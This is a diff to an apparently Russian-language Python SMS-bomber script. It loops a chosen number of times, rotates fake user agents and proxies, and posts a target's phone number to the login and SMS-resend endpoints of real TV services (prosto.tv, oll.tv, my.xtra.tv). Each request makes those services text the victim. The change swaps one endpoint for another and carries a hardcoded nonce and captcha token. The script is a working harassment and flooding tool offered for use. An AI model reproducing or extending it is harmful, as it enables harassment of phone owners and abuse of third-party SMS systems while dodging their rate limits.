@@ -49,10 +49,10 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
  try:
-         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "resend-sms", "phone": number, "_nonce": "f756e84935", "g_token": "03AGdBq26EobJUiHnokFKND-S2I7C46jdehz_ek1kV-4E1nMs6dHBG8xQDsNqtSwyVvbKqQDzMr9d9jx9KekrJL_F6v1afaqSmte-el3RB3zE_LL-iYrbae8wYygpwicPeFoZy8qPJmOJW2o3U4KgP74MGrXv3PFY-3rBZK4L3ieSvEAcGI8MA8L6PmmINgZ1jzX4Kd8_G6QNPREbg2uP88xEYju31VqVbY1B4rGjSee3IaOsRIwzXxLXm7yX3fluYRg-ynA14ke_lkwxeA-mnUCi_oKoNYoumqrq6sk64v50dqm98iZfSjAy-HhWVxpGSEadAgg860dbItvlYNxpoPxCTSjN9kmsmdEpJc8J3Exd27botpJBs_dEEtKmQh7Rorz-sSerIAxbss66cl5N7H-Ih_TUMEIKJGWLAXBYDrOMUa7IBu6HtnKQgG0LwDQqGDiwDMOw7mKrl"}, headers=headers, proxies=proxies)
-         print('prosto.tv')
+         requests.post("https://oll.tv/api/v3/auth/login?lang=rus", data={"login": number}, headers=headers, proxies=proxies)
+         print('66666666666')
  except:
-         print('Не отправлено (prosto.tv)')
+         print('Не отправлено (888888888888888)')
  try:#ok
          requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers, proxies=proxies)
          print('my.xtra.tv')
